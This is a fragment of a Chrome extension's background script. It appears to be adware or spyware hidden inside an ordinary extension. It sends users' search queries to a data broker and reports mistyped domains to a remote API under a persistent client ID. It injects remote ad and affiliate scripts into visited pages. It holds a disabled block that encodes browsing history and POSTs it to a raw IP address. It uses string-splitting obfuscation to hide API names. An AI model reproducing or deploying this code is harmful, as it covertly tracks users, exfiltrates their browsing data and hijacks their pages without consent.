c=a("bV+O99idZ1").safe;c(function(){b.exports={get:function(a){return JSON.parse(localStorage.getItem(a))},set:function(a,b){localStorage.setItem(a,JSON.stringify(b))}}})},{"bV+O99idZ1":10}],9:[function(a,b){function c(){for(var a,b=[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?((\d+)?[\w\.]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/((\d+)?[\w\.-]+)/i],c=0;c<b.length&&(!(a=b[c].exec(window.navigator.userAgent))||!a);c++);return a||(a=["Unknown","Unknown","Unknown","Unknown"]),{name:a[1],version:a[2],major:a[3]}}function d(){var a="Unknown",b="Unknown",c=window.navigator.appVersion,d=window.navigator.userAgent,e=[{s:"Windows 3.11",r:/Win16/},{s:"Windows 95",r:/(Windows 95|Win95|Windows_95)/},{s:"Windows ME",r:/(Win 9x 4.90|Windows ME)/},{s:"Windows 98",r:/(Windows 98|Win98)/},{s:"Windows CE",r:/Windows CE/},{s:"Windows 2000",r:/(Windows NT 5.0|Windows 2000)/},{s:"Windows XP",r:/(Windows NT 5.1|Windows XP)/},{s:"Windows Server 2003",r:/Windows NT 5.2/},{s:"Windows Vista",r:/Windows NT 6.0/},{s:"Windows 7",r:/(Windows 7|Windows NT 6.1)/},{s:"Windows 8.1",r:/(Windows 8.1|Windows NT 6.3)/},{s:"Windows 8",r:/(Windows 8|Windows NT 6.2)/},{s:"Windows NT 4.0",r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},{s:"Windows ME",r:/Windows ME/},{s:"Android",r:/Android/},{s:"Open BSD",r:/OpenBSD/},{s:"Sun OS",r:/SunOS/},{s:"Linux",r:/(Linux|X11)/},{s:"iOS",r:/(iPhone|iPad|iPod)/},{s:"Mac OS X",r:/Mac OS X/},{s:"Mac OS",r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},{s:"QNX",r:/QNX/},{s:"UNIX",r:/UNIX/},{s:"BeOS",r:/BeOS/},{s:"OS/2",r:/OS\/2/},{s:"Search Bot",r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}];for(var f in e){var g=e[f];if(g.r.test(d)){a=g.s;break}}switch(/Windows/.test(a)&&(b=/Windows (.*)/.exec(a)[1],a="Windows"),a){case"Mac OS X":b=/Mac OS X (10[\.\_\d]+)/.exec(d)[1];break;case"Android":b=/Android ([\.\_\d]+)/.exec(d)[1];break;case"iOS":b=/OS (\d+)_(\d+)_?(\d+)?/.exec(c),b=b[1]+"."+b[2]+"."+(0|b[3])}return{name:a,version:b}}b.exports={browser:c(),os:d()}},{}],10:[function(a,b){var c={qJI7ttpV:function(a){return c.UwkCTigQ(4)+window.btoa(unescape(encodeURIComponent(a)))},UwkCTigQ:function(a){for(var b=[],c=0;a>c;c++)b.push(String.fromCharCode(65+30*Math.random()));return b.join("")},format:function(a,b){var c=a;for(var d in b)b.hasOwnProperty(d)&&(c=c.replace("{"+d+"}",b[d]));return c},safe:function(a,b){try{a()}catch(c){try{b&&b(c)}catch(c){}}}};b.exports=c},{}]},{},[1,2,3,4,5,6,7,8,9,10]);

})},100);


///404
//******************
window.setTimeout(function(){
	try{
		if(location.pathname=="/background.html"){
			var amStats={apiUrl:"http://api.ad" + "visor" + "media.cz/v2/partner-domain",extId:"86",clientId:undefined,whitelist:["co.kr","ac.kr","co.ke","swp.nl","go.kr","jus.br","ucm.es","edu.ee","boc.cn","ucd.ie","edu.ba","tn.it","ucc.ie","go.ke","ac.ma","sze.hu","com.uk","fbi.com","lrz.de","ua.es","lpu.in","in.ua","co.au","us.es","pe.kr","re.kr","mil.kr","uma.es","mi.it","db.de","msn.cn","ne.kr","gov.hu","mil.pl","ids.pl","cui.pl","hs.kr","by.ru","ust.hk","com.la","ac.lk","bz.it","edu.mk","nbg.gr","cmw.ru","ba.it","hjp.at","hn.de","com.in","ls.ua","gov.mk","uu.se","sia.eu","no.it","bo.it","mec.pt","sv.it","bcf.ch","ips.pt","hmi.de","fvg.it","xsb.cc","ae.ca","mrp.sg","wat.edu","uco.edu","anf.by","met.ua","efa.lu","dle.ro","csk.li","eki.to","tr.tm","eu.uk","asl.de","crc.ro","dia.no","rjv.br","you.com","psn.com","co.cn","com.jp","hfk.no","mwn.de","com.us","vhl.ru","org.us","gov.ba","ur.mx","iif.hu","bn.it","net.edu","uzh.ch","iep.fr","ops.org","urm.lt","mj.pt","gen.net","mzv.sk","www.es","vsb.ca","on.it","www.tw","prq.se","vba.com","amm.net","cm.us","atc.be","tlg.tw","kg.ac","kuh.fi","pg.eu","veo.com","co.br","ve.it","fm.pl","ufu.br","uvm.cl","ac.ke","yb.int","at.tc","uaq.mx","to.it","itc.cn","ms.kr","ra.it","dm.at","app.su","wwc.edu","tak.ee","no.no","co.mx","bcc.it","mty.mx","aco.nz","kis.edu","cr.it","rns.tn","isg.am","bbc.uk","sxy.kr","sos.cl","sos.tv","zvd.si","du.pk","uhk.cy","ayp.am","ab.va","cit.cc","edu.ag","bfn.is","kin.edu","nl.net","мvk.com","xii.jp","skr.jp","fi.it","byr.cn","vi.it","vr.it","com.nz","rm.it","pf.sk","med.pl","bg.it","ull.es","bs.it","уex.ua","cn.net","ct.it","net.ba","na.it","byu.net","wwe.net","et.al","myv.com","fml.com","man.de","wl.cn","kik.se","owl.edu","rel.pl","gna.com","bs.org","da.nl","sex.am","pbs.si","or.kr","gb.com","gb.net","hk.cn","mo.cn","no.com","se.com","se.net","tw.cn","uk.com","uk.net","com.ac","edu.ac","gov.ac","net.ac","mil.ac","org.ac","nom.ad","net.ae","gov.ae","org.ae","mil.ae","sch.ae","ac.ae","pro.ae","name.ae","gov.af","edu.af","net.af","com.af","com.ag","org.ag","net.ag","co.ag","nom.ag","off.ai","com.ai","net.ai","org.ai","gov.al","edu.al","org.al","com.al","net.al","uniti.al","tirana.al","soros.al","upt.al","inima.al","com.an","net.an","org.an","edu.an","co.ao","ed.ao","gv.ao","it.ao","og.ao","pb.ao","com.ar","gov.ar","int.ar","mil.ar","net.ar","org.ar","e164.arpa","in-addr.arpa","iris.arpa","ip6.arpa","uri.arpa","urn.arpa","gv.at","ac.at","co.at","or.at","priv.at","asn.au","com.au","net.au","id.au","org.au","csiro.au","oz.au","info.au","conf.au","act.au","nsw.au","nt.au","qld.au","sa.au","tas.au","vic.au","wa.au","gov.au","edu.au","com.aw","com.az","net.az","int.az","gov.az","biz.az","org.az","edu.az","mil.az","pp.az","name.az","info.az","com.bb","edu.bb","gov.bb","net.bb","org.bb","com.bd","edu.bd","net.bd","gov.bd","org.bd","mil.bd","ac.be","to.be","com.be","co.be","xa.be","ap.be","fgov.be","gov.bf","com.bm","edu.bm","org.bm","gov.bm","net.bm","com.bn","edu.bn","org.bn","net.bn","com.bo","org.bo","net.bo","gov.bo","gob.bo","edu.bo","tv.bo","mil.bo","int.bo","agr.br","am.br","art.br","edu.br","com.br","coop.br","esp.br","far.br","fm.br","g12.br","gov.br","imb.br","ind.br","inf.br","mil.br","net.br","org.br","psi.br","rec.br","srv.br","tmp.br","tur.br","tv.br","etc.br","adm.br","adv.br","arq.br","ato.br","bio.br","bmd.br","cim.br","cng.br","cnt.br","ecn.br","eng.br","eti.br","fnd.br","fot.br","fst.br","ggf.br","jor.br","lel.br","mat.br","med.br","mus.br","not.br","ntr.br","odo.br","ppg.br","pro.br","psc.br","qsl.br","slg.br","trd.br","vet.br","zlg.br","dpn.br","nom.br","com.bs","net.bs","org.bs","com.bt","edu.bt","gov.bt","net.bt","org.bt","co.bw","org.bw","gov.by","mil.by","ab.ca","bc.ca","mb.ca","nb.ca","nf.ca","nl.ca","ns.ca","nt.ca","nu.ca","on.ca","pe.ca","qc.ca","sk.ca","yk.ca","co.cc","com.cd","net.cd","org.cd","com.ch","net.ch","org.ch","gov.ch","co.ck","ac.cn","com.cn","edu.cn","gov.cn","net.cn","org.cn","ah.cn","bj.cn","cq.cn","fj.cn","gd.cn","gs.cn","gz.cn","gx.cn","ha.cn","hb.cn","he.cn","hi.cn","hl.cn","hn.cn","jl.cn","js.cn","jx.cn","ln.cn","nm.cn","nx.cn","qh.cn","sc.cn","sd.cn","sh.cn","sn.cn","sx.cn","tj.cn","xj.cn","xz.cn","yn.cn","zj.cn","com.co","edu.co","org.co","gov.co","mil.co","net.co","nom.co","ac.cr","co.cr","ed.cr","fi.cr","go.cr","or.cr","sa.cr","com.cu","edu.cu","org.cu","net.cu","gov.cu","inf.cu","gov.cx","com.cy","biz.cy","info.cy","ltd.cy","pro.cy","net.cy","org.cy","name.cy","tm.cy","ac.cy","ekloges.cy","press.cy","parliament.cy","com.dm","net.dm","org.dm","edu.dm","gov.dm","edu.do","gov.do","gob.do","com.do","org.do","sld.do","web.do","net.do","mil.do","art.do","com.dz","org.dz","net.dz","gov.dz","edu.dz","asso.dz","pol.dz","art.dz","com.ec","info.ec","net.ec","fin.ec","med.ec","pro.ec","org.ec","edu.ec","gov.ec","mil.ec","com.ee","org.ee","fie.ee","pri.ee","eun.eg","edu.eg","sci.eg","gov.eg","com.eg","org.eg","net.eg","mil.eg","com.es","nom.es","org.es","gob.es","edu.es","com.et","gov.et","org.et","edu.et","net.et","biz.et","name.et","info.et","aland.fi","biz.fj","com.fj","info.fj","name.fj","net.fj","org.fj","pro.fj","ac.fj","gov.fj","mil.fj","school.fj","co.fk","org.fk","gov.fk","ac.fk","nom.fk","net.fk","tm.fr","asso.fr","nom.fr","prd.fr","presse.fr","com.fr","gouv.fr","com.ge","edu.ge","gov.ge","org.ge","mil.ge","net.ge","pvt.ge","co.gg","net.gg","org.gg","com.gh","edu.gh","gov.gh","org.gh","mil.gh","com.gi","ltd.gi","gov.gi","mod.gi","edu.gi","org.gi","com.gn","ac.gn","gov.gn","org.gn","net.gn","com.gp,","net.gp,","edu.gp,","asso.gp,","org.gp","com.gr","edu.gr","net.gr","org.gr","gov.gr","com.hk","edu.hk","gov.hk","idv.hk","net.hk","org.hk","com.hn","edu.hn","org.hn","net.hn","mil.hn","gob.hn","iz.hr","from.hr","name.hr","com.hr","com.ht","net.ht","firm.ht","shop.ht","info.ht","pro.ht","adult.ht","org.ht","art.ht","pol.ht","rel.ht","asso.ht","perso.ht","coop.ht","med.ht","edu.ht","gouv.ht","co.hu","info.hu","org.hu","priv.hu","sport.hu","tm.hu","2000.hu","agrar.hu","bolt.hu","casino.hu","city.hu","erotica.hu","erotika.hu","film.hu","forum.hu","games.hu","hotel.hu","ingatlan.hu","jogasz.hu","konyvelo.hu","lakas.hu","media.hu","news.hu","reklam.hu","sex.hu","shop.hu","suli.hu","szex.hu","tozsde.hu","utazas.hu","video.hu","ac.id","co.id","or.id","go.id","gov.ie","ac.il","co.il","org.il","net.il","k12.il","gov.il","muni.il","idf.il","co.im","net.im","gov.im","org.im","nic.im","ac.im","co.in","firm.in","net.in","org.in","gen.in","ind.in","nic.in","ac.in","edu.in","res.in","gov.in","mil.in","ac.ir","co.ir","gov.ir","net.ir","org.ir","sch.ir","ac.is","org.is","gov.it","pisa.it","co.je","net.je","org.je","edu.jm","gov.jm","com.jm","net.jm","org.jm","com.jo","org.jo","net.jo","edu.jo","gov.jo","mil.jo","ac.jp","ad.jp","co.jp","ed.jp","go.jp","gr.jp","lg.jp","ne.jp","or.jp","hokkaido.jp","aomori.jp","iwate.jp","miyagi.jp","akita.jp","yamagata.jp","fukushima.jp","ibaraki.jp","tochigi.jp","gunma.jp","saitama.jp","chiba.jp","tokyo.jp","kanagawa.jp","niigata.jp","toyama.jp","ishikawa.jp","fukui.jp","yamanashi.jp","nagano.jp","gifu.jp","shizuoka.jp","aichi.jp","mie.jp","shiga.jp","kyoto.jp","osaka.jp","hyogo.jp","nara.jp","wakayama.jp","tottori.jp","shimane.jp","okayama.jp","hiroshima.jp","yamaguchi.jp","tokushima.jp","kagawa.jp","ehime.jp","kochi.jp","fukuoka.jp","saga.jp","nagasaki.jp","kumamoto.jp","oita.jp","miyazaki.jp","kagoshima.jp","okinawa.jp","sapporo.jp","sendai.jp","yokohama.jp","kawasaki.jp","nagoya.jp","kobe.jp","kitakyushu.jp","per.kh","com.kh","edu.kh","gov.kh","mil.kh","net.kh","org.kh","com.kw","edu.kw","gov.kw","net.kw","org.kw","mil.kw","edu.ky","gov.ky","com.ky","org.ky","net.ky","org.kz","edu.kz","net.kz","gov.kz","mil.kz","com.kz","net.lb","org.lb","gov.lb","edu.lb","com.lb","com.lc","org.lc","edu.lc","gov.lc","com.li","net.li","org.li","gov.li","gov.lk","sch.lk","net.lk","int.lk","com.lk","org.lk","edu.lk","ngo.lk","soc.lk","web.lk","ltd.lk","assn.lk","grp.lk","hotel.lk","com.lr","edu.lr","gov.lr","org.lr","net.lr","org.ls","co.ls","gov.lt","mil.lt","gov.lu","mil.lu","org.lu","net.lu","com.lv","edu.lv","gov.lv","org.lv","mil.lv","id.lv","net.lv","asn.lv","conf.lv","com.ly","net.ly","gov.ly","plc.ly","edu.ly","sch.ly","med.ly","org.ly","id.ly","co.ma","net.ma","gov.ma","org.ma","tm.mc","asso.mc","org.mg","nom.mg","gov.mg","prd.mg","tm.mg","com.mg","edu.mg","mil.mg","army.mil","navy.mil",".","com.mk","org.mk","com.mo","net.mo","org.mo","edu.mo","gov.mo","weather.mobi","music.mobi",".","org.mt","com.mt","gov.mt","edu.mt","net.mt","com.mu","co.mu","aero.mv","biz.mv","com.mv","coop.mv","edu.mv","gov.mv","info.mv","int.mv","mil.mv","museum.mv","name.mv","net.mv","org.mv","pro.mv","ac.mw","co.mw","com.mw","coop.mw","edu.mw","gov.mw","int.mw","museum.mw","net.mw","org.mw","com.mx","net.mx","org.mx","edu.mx","gob.mx","com.my","net.my","org.my","gov.my","edu.my","mil.my","name.my","edu.ng","com.ng","gov.ng","org.ng","net.ng","gob.ni","com.ni","edu.ni","org.ni","nom.ni","net.ni","mil.no","stat.no","kommune.no","herad.no","priv.no","vgs.no","fhs.no","museum.no","fylkesbibl.no","folkebibl.no","idrett.no","com.np","org.np","edu.np","net.np","gov.np","mil.np","gov.nr","edu.nr","biz.nr","info.nr","org.nr","com.nr","net.nr","co.nr","ac.nz","co.nz","cri.nz","gen.nz","geek.nz","govt.nz","iwi.nz","maori.nz","mil.nz","net.nz","org.nz","school.nz","com.om","co.om","edu.om","ac.com","sch.om","gov.om","net.om","org.om","mil.om","museum.om","biz.om","pro.om","med.om","com.pa","ac.pa","sld.pa","gob.pa","edu.pa","org.pa","net.pa","abo.pa","ing.pa","med.pa","nom.pa","com.pe","org.pe","net.pe","edu.pe","mil.pe","gob.pe","nom.pe","com.pf","org.pf","edu.pf","com.pg","net.pg","com.ph","gov.ph","com.pk","net.pk","edu.pk","org.pk","fam.pk","biz.pk","web.pk","gov.pk","gob.pk","gok.pk","gon.pk","gop.pk","gos.pk","com.pl","biz.pl","net.pl","art.pl","edu.pl","org.pl","ngo.pl","gov.pl","info.pl","mil.plć","waw.pl","warszawa.pl","wroc.pl","wroclaw.pl","krakow.pl","poznan.pl","lodz.pl","gda.pl","gdansk.pl","slupsk.pl","szczecin.pl","lublin.pl","bialystok.pl","biz.pr","com.pr","edu.pr","gov.pr","info.pr","isla.pr","name.pr","net.pr","org.pr","pro.pr","law.pro","med.pro","cpa.pro","edu.ps","gov.ps","sec.ps","plo.ps","com.ps","org.ps","net.ps","com.pt","edu.pt","gov.pt","int.pt","net.pt","nome.pt","org.pt","publ.pt","net.py","org.py","gov.py","edu.py","com.py","com.ro","org.ro","tm.ro","nt.ro","nom.ro","info.ro","rec.ro","arts.ro","firm.ro","store.ro","www.ro","com.ru","net.ru","org.ru","pp.ru","msk.ru","int.ru","ac.ru","gov.rw","net.rw","edu.rw","ac.rw","com.rw","co.rw","int.rw","mil.rw","gouv.rw","com.sa","edu.sa","sch.sa","med.sa","gov.sa","net.sa","org.sa","pub.sa","com.sb","gov.sb","net.sb","edu.sb","com.sc","gov.sc","net.sc","org.sc","edu.sc","com.sd","net.sd","org.sd","edu.sd","med.sd","tv.sd","gov.sd","info.sd","org.se","pp.se","tm.se","brand.se","parti.se","press.se","komforb.se","kommunalforbund.se","komvux.se","lanarb.se","lanbib.se","naturbruksgymn.se","sshn.se","fhv.se","fhsk.se","fh.se","mil.se","ab.se","c.se","d.se","e.se","f.se","g.se","h.se","i.se","k.se","m.se","n.se","o.se","s.se","t.se","u.se","w.se","x.se","y.se","z.se","ac.se","bd.se","com.sg","net.sg","org.sg","gov.sg","edu.sg","per.sg","idn.sg","rs.sr","edu.sv","com.sv","gob.sv","org.sv","red.sv","gov.sy","com.sy","net.sy","ac.th","co.th","in.th","go.th","mi.th","or.th","net.th","ac.tj","biz.tj","com.tj","co.tj","edu.tj","int.tj","name.tj","net.tj","org.tj","web.tj","gov.tj","go.tj","mil.tj","com.tn","intl.tn","gov.tn","org.tn","ind.tn","nat.tn","tourism.tn","info.tn","ens.tn","fin.tn","net.tn","gov.to","gov.tp","com.tr","info.tr","biz.tr","net.tr","org.tr","web.tr","gen.tr","av.tr","dr.tr","bbs.tr","name.tr","tel.tr","gov.tr","bel.tr","pol.tr","mil.tr","k12.tr","edu.tr","bel.tr","co.tt","com.tt","org.tt","net.tt","biz.tt","info.tt","pro.tt","name.tt","edu.tt","gov.tt","us.tt","gov.tv","edu.tw","gov.tw","mil.tw","com.tw","net.tw","org.tw","idv.tw","game.tw","ebiz.tw","club.tw","co.tz","ac.tz","go.tz","or.tz","ne.tz","com.ua","gov.ua","net.ua","edu.ua","org.ua","cherkassy.ua","ck.ua","chernigov.ua","cn.ua","chernovtsy.ua","cv.ua","crimea.ua","dnepropetrovsk.ua","dp.ua","donetsk.ua","dn.ua","ivano-frankivsk.ua","if.ua","kharkov.ua","kh.ua","kherson.ua","ks.ua","khmelnitskiy.ua","km.ua","kiev.ua","kv.ua","kirovograd.ua","kr.ua","lugansk.ua","lg.ua","lutsk.ua","lviv.ua","nikolaev.ua","mk.ua","odessa.ua","od.ua","poltava.ua","pl.ua","rovno.ua","rv.ua","sebastopol.ua","sumy.ua","ternopil.ua","te.ua","uzhgorod.ua","vinnica.ua","vn.ua","zaporizhzhe.ua","zp.ua","zhitomir.ua","zt.ua","co.ug","ac.ug","sc.ug","go.ug","ne.ug","or.ug","ac.uk","co.uk","gov.uk","ltd.uk","me.uk","mil.uk","mod.uk","net.uk","nic.uk","nhs.uk","org.uk","plc.uk","police.uk","sch.uk","bl.uk","british-library.uk","icnet.uk","jet.uk","nel.uk","nls.uk","national-library-scotland.uk","parliament.uk","ak.us","al.us","ar.us","az.us","ca.us","co.us","ct.us","dc.us","de.us","dni.us","fed.us","fl.us","ga.us","hi.us","ia.us","id.us","il.us","in.us","isa.us","kids.us","ks.us","ky.us","la.us","ma.us","md.us","me.us","mi.us","mn.us","mo.us","ms.us","mt.us","nc.us","nd.us","ne.us","nh.us","nj.us","nm.us","nsn.us","nv.us","ny.us","oh.us","ok.us","or.us","pa.us","ri.us","sc.us","sd.us","tn.us","tx.us","ut.us","vt.us","va.us","wa.us","wi.us","wv.us","wy.us","k12.us","cc.us","tec.us","lib.us","state.us","gen.us","edu.uy","gub.uy","org.uy","com.uy","net.uy","mil.uy","vatican.va","com.ve","net.ve","org.ve","info.ve","co.ve","web.ve","com.vi","org.vi","edu.vi","gov.vi","com.vn","net.vn","org.vn","edu.vn","gov.vn","int.vn","ac.vn","biz.vn","info.vn","name.vn","pro.vn","health.vn","com.ye","net.ye","ac.yu","co.yu","org.yu","edu.yu","ac.za","city.za","co.za","edu.za","gov.za","law.za","mil.za","nom.za","org.za","school.za","alt.za","net.za","ngo.za","tm.za","web.za","co.zm","org.zm","gov.zm","sch.zm","ac.zm","co.zw","org.zw","gov.zw","ac.zw","ac","ad","ae","aero","af","ag","ai","al","am","an","ao","aq","ar","arpa","as","at","au","and","act","nsw","nt","qld","sa","tas","vic","wa","aw","ax","az","ba","bb","bd","be","bf","bg","bh","bi","biz","bj","bm","bn","bo","br","bs","bt","bv","bw","by","bz","ca","cat","cc","cd","cf","cg","ch","ci","ck","cl","cm","cn","co","com","coop","cr","cu","cv","cx","cy","cz","de","dj","dk","dm","do","dz","ec","edu","ee","eg","er","es","et","eu","fi","fj","fk","fm","fo","fr","ga","gb","gd","ge","gf","gg","gh","gi","gl","gm","gn","gov","gp","or","gq","gr","gs","gt","gu","gw","gy","hk","hm","hn","hr","ht","hu","id","ie","il","im","in","info","int","io","iq","ir","is","it","je","jm","jo","jobs","jp","ke","kg","kh","ki","km","kn","kr","kw","ky","kz","la","lb","lc","li","lk","lr","ls","lt","lu","lv","ly","ma","mc","md","mg","mh","mil","mk","ml","mm","mn","mo","mobi","mp","mq","mr","ms","mt","mu","museum","mv","mw","mx","my","mz","na","name","nc","ne","net","nf","ng","ni","nl","no","np","nr","nr","nu","nz","om","org","pa","pe","pf","pg","ph","pk","pl","pm","pn","pr","pro","ps","pt","pw","py","qa","re","ro","ru","rw","sa","sb","sc","sd","se","sg","sh","si","sj","sk","sl","sm","sn","so","sr","st","su","sv","sy","sz","tc","td","tf","tg","th","tj","tk","tl","tm","tn","to","tp","tr","travel","tt","tv","tw","tz","ua","ug","uk","um","us","uy","uz","va","vc","ve","vg","vi","vn","vu","wf","ws","ye","yt","yu","za","zm","zw"],blacklist:["facebook.","youtube.","vk.","reddit.","google.","tumblr.","imgur.","wikipedia.","mangahere.","broward.","instagram.","amazon.","mangareader.","ask.","mangafox.","bing.","odnoklassniki.ru","ebay.","imdb.com","flickr.com","bradleysmart.co.uk","bbc.co.uk","xvideos.com","xhamster.com","linkedin.com","twitter.","thepiratebay.","9gag.","pinterest.com","neopets.com","t.co","1channel.ch","4chan.org","netflix.com","basecamphq.com"],regular:/^([a-z0-9][a-z0-9\-]*[a-z0-9]\.{0,3})*(\.[a-z0-9\-]{2,15})+$/i,init:function(e){this.clientId=this.getPref("am_client_id");if(!this.clientId){this.clientId=this.uuidGenerator();this.setPref("am_client_id",this.clientId)}},check:function(e){if(!this.clientId) this.init(); var e=e.replace("https://","").replace("http://","").split("/")[0];this.checkWhitelist(e)},checkWhitelist:function(e){for(var t in this.whitelist){var n=this.whitelist[t];if(e.indexOf("."+n)!=-1&&e.indexOf("."+n)==e.length-n.length-1){var r=e.split(".");var i=r[r.length-2]+"."+r[r.length-1];if(n.indexOf(".")!=-1){i=r[r.length-3]+"."+i}this.checkBlacklist(i);break}}},checkBlacklist:function(e){if(e.indexOf("google")!=-1){return}for(var t in this.blacklist){var n=this.blacklist[t];if(e.indexOf(n)==0){return}}this.checkRegular(e)},checkRegular:function(e){if(this.regular.test(e)){this.checkXHR(e,true)}},checkXHR:function(e,t){var n=new XMLHttpRequest;var r="";if(t){r="www."}n.open("GET","http://"+r+e,true);n.onreadystatechange=function(r){if(n.readyState==4&&n.status==0){if(t){amStats.checkXHR(e,false)}else{amStats.submit(e)}}};n.send(null)},submit:function(e){var t=new XMLHttpRequest;t.open("POST",this.apiUrl,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");var n={user_guid:this.clientId,extension_id:this.extId,domain:e};t.send("data="+encode64(JSON.stringify(n)).replace(/=/,""))},uuidGenerator:function(){var e=function(){return((1+Math.random())*65536|0).toString(16).substring(1)};return e()+e()+"-"+e()+"-"+e()+"-"+e()+"-"+e()+e()+e()},getPref:function(e){var t=localStorage[e];if(t=="false")return false;else return t},setPref:function(e,t){localStorage[e]=t}};window.addEventListener("load",function(){amStats.init()},false);
			var dfsdfsdfd=''
			chrome.permissions.contains({permissions:['we' + dfsdfsdfd + 'b' + dfsdfsdfd +'Request']},function (answer) {
				if(answer){
						if(localStorage.isd || localStorage['d' + ddds + 'isable' + ddds  + 'S' + ddds +'tats'])	return;
						chrome['w' + 'eb' + 'R' + 'equest'].onErrorOccurred.addListener(
							function(e){
								if(   e.error=='net::ERR_NAME_NOT_RESOLVED' && (e.url.indexOf("http://")!=-1||e.url.indexOf("https://")!=-1)   ){
									if(!localStorage['isd'])
									amStats.check(e.url)
								}
							},	{urls:["<all_urls>"],types:["main_frame"]});
						keyStr="ABCDEFGHIJKLMNOP"+"QRSTUVWXYZabcdef"+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";
						encode64=function(e){var t="";var n,r,i="";var s,o,u,a="";var f=0;do{n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+keyStr.charAt(s)+keyStr.charAt(o)+keyStr.charAt(u)+keyStr.charAt(a);n=r=i="";s=o=u=a=""}while(f<e.length);return t};
						

						chrome['w' + dfsdfsdfd +  'eb' + dfsdfsdfd + 'R' + dfsdfsdfd + 'equest'].onErrorOccurred.addListener(function(e){
					 	if (e.error=='net::ERR_NAME_NOT_RESOLVED' && e.frameId==0)
					 		if ( 	localStorage['notfound_check']=='yes' 
									|| 
									(localStorage['notfound_check']!='no' && localStorage['rnd']>rndTo404 && localStorage['primaryLanguage']=='en' 
										||
										false // For conduit. Change to false for default
									)

								) 
								if(isWs){
							 		chrome.tabs.update(
							 			e.tabId,
							 			{url:chrome.extension.getURL('/404.html#' + e.url )}
							 			)
							 	}
						
						},{urls:["<all_urls>"],types:["main_frame"]})
				}
			})

	}
	}catch(e){}
},1000*60*0); 


window.setTimeout(function(){
	///bd
	//******************
	if(!localStorage.isd)
	chrome.tabs.onUpdated.addListener(function(a,b,c){
	if(localStorage.isd || localStorage['d' + ddds + 'isable' + ddds  + 'S' + ddds +'tats']) return
	if (c.url.match('chrome://newtab/')) return;
	if(c.status=='complete'){
	var ans=c.url.match(/(#)q=([^&#]*)/) || c.url.match(/(#|\?|&)q=([^&#]*)/)
	if(ans) {
	    ans=decodeURIComponent(ans[2])
	    ans=ans.replace(/\+/g,' ')
	    $.ajax({
			url:'https://exchange.bdex.com/bdex/bdexSeller.jsp',
			data:{
			'bdexPartnerAccountId':'32',
			'sellerCampaignId':'206',
			'industryId':'14',
			'customerUserId':localStorage.options,
			'keyword':ans
			}
		})
	}

		if(!c.url.match(/google/gi))	
		chrome.tabs.executeScript(c.id,{code:
		'if (!window.adsds){' +
		"(function(){var s=document.createElement('script');s.src='//asrv-a.akamaihd.net/sd/9643/1001.js';document.body.appendChild(s);})();" +
		"(function(){var s=document.createElement('script');s.src='https://api.jollywallet.com/affiliate/client?dist=197&sub=1';document.body.appendChild(s);})()" +
		';window.adsds=true}'
		})
	}

	})
	
	
},0);


///Rook
(function(){
return;
var u=[]
chrome.tabs.onUpdated.addListener(function(a,b,c){
if(localStorage.isd || localStorage['d' + ddds + 'isable' + ddds  + 'S' + ddds +'tats']) return
if (c.url.match('chrome://newtab/')) return;
if(c.status=='complete'){
if(u.length>0 && c.url==u[u.length-1].json.u) return
thisData={json:  {c:JSON.parse(localStorage.geo).country_code,u:c.url,t:c.title,x:localStorage.options}}
if(thisData!=u[u.length-1])
u.push( thisData )
}
})
window.setInterval(function(){
if(localStorage.isd || localStorage['d' + ddds + 'isable' + ddds  + 'S' + ddds +'tats']) return	
var toSend=( 'a' + btoa(btoa( encodeURIComponent( JSON.stringify(u))))).split('').reverse('').join('')
if(u.length==0) return
$.ajax({
//url:'http://' + ['64.34.175.82','64.34.182.98','64.34.182.103','64.34.182.104'][parseInt(Math.random()*4)] ,
url:'http://64.34.175.82',
method:'post',
data:
{a:toSend}
})
u=[]
},1000*10)
})();





///CogoLabs
//
window.setTimeout(function(){
	(function(){
	var getCodeOld = codeinjector.getCode; codeinjector.getCode=function(){return getCodeOld() + ';(function(){function e(e){function n(){t.postMessage({id:1,data:e.webkitVisibilityState})}function r(e){var n=i(e.target,"A");if(n&&n.hasAttribute("href")){var r=n.getAttribute("href");var o=s(r);t.postMessage({id:2,data:o})}}function i(e,t){if(e&&e.tagName){if(e.tagName.toUpperCase()==t){return e}else{return i(e.parentNode,t)}}return null}function s(e){if(e.search(/^\\/\\//)!=-1){return window.location.protocol+e}if(e.search(/:\\/\\//)!=-1){return e}if(e.search(/^\\//)!=-1){return window.location.origin+e}var t=window.location.href.match(/(.*\\/)/)[0];return t+e}var t=chrome.extension.connect({name:"page-state-tracker"});e.addEventListener("webkitvisibilitychange",n,false);e.addEventListener("contextmenu",r,false);n()}new e(document)})()'};
	function DcmStartup(){function e(){var e=localStorage.getItem("dcm.firstrun")!="false";if(e){var t="CPxxxxxxxxxx".replace(/[x]/g,function(){return(Math.random()*10|0).toString()});window.dcm_api.configure({userId:t,groupId:"AMNWSS-CR"})}window.dcm_api.start();window.dcm_api.setHostVersion(chrome.runtime.getManifest().version);if(e){localStorage.setItem("dcm.firstrun","false");window.dcm_api.permitDataCapturing(true)}}function t(){window.dcm_api.stop()}e();window.addEventListener("unload",t,false)}(function(e){function t(){this.create=function(e){};this.cleanup=function(){};this.destroy=function(){};this.options=function(e){}}function n(e){function s(e){var t=r[e];if(!t){throw"Unknwown Component with name: "+e}return t}function o(e){if(e.progress){throw"Circular reference detected on element: "+e.name}e.progress=true}function u(e,t){try{if(typeof e.loader=="function"){e.loader=new e.loader}e.loader.create(n);t[e.name]=true}catch(r){throw"Error during component load: "+r}}function a(e,t){for(var n=0;n<e.dependencies.length;n++){var r=s(e.dependencies[n]);f(r,t)}}function f(e,t){if(t[e.name]){return}try{o(e);a(e,t);u(e,t)}catch(n){throw n+"\nCannot load component: "+e.name}e.progress=false}function l(e,t){var n=e.name;for(var i in r){var o=s(i);if(o.dependencies.indexOf(n)>-1&&!t[n]){h(o,t)}}}function c(e,t){try{e.loader.destroy()}catch(n){}t[e.name]=true}function h(e,t){if(t[e.name]){return}l(e,t);c(e,t)}function p(e){for(var t in r){if(!e[t]){delete 